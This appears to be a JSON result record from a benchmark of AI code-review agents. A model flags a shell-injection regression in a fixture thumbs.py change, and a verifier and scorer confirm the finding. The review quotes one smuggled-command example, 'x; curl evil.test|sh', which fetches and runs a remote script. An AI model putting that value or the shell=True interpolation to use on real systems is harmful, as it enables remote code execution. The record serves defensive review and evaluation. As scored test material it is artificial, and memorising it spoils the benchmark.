@@ -1,0 +1,95 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 38.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 38.3,
+  "usage": {
+    "in": 30057,
+    "cache_read": 57728,
+    "cache_write": 0,
+    "out": 1651,
+    "source": "cli"
+  },
+  "cost_usd": 0.0873384,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "Switching `subprocess.run` to `shell=True` and building the command with an f-string turns `upload_dir`, `name`, and `oid` into shell syntax. A value such as `x; curl evil.test|sh` (or `$(...)`, backticks, `|`) runs as a separate command on the host under the service account.\n\nThe argv-list form already invoked convert without a shell; keep that shape (or `magick` on IM7) and fix policy/delegate configuration separately. If a shell were ever unavoidable, pass a fixed argv to `convert` via env/`--` and never interpolate untrusted path segments into the command string.\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```"
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces shell injection in `make_thumb` by switching from an argv list to `subprocess.run(..., shell=True)` with unquoted interpolation of `upload_dir`, `name`, and `oid`.\n\n## Narrative\n\nThe previous call used the safe argv-list form (`[\"/usr/bin/convert\", src, dst]`), so metacharacters in filenames could not start a second command. The new form builds a single shell string:\n\n```python\nf\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\"\n```\n\nAny of those three values can break out of the intended `convert` invocation (`;`, `|`, `$(...)`, backticks, whitespace, glob characters). Upload pipelines commonly pass user-influenced names; even a partially validated `name` does not make `shell=True` safe once the values are concatenated into a shell command. The PR also drops the absolute `/usr/bin/convert` path, so PATH hijacking becomes relevant on the same runner.\n\nImageMagick 7 policy/delegate issues are real operational concerns, but they are solved with argv-form `magick`/`convert`, explicit policy configuration, or env \u2014 not by enabling the shell.\n\n## Release decision\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head version of thumbs.py runs `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid` into the shell command; the base used a fixed argv list without a shell. That is a real command-injection regression at critical severity."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.659,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2389,
+      "out": 334
+    },
+    "cost_usd": 0.007192
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
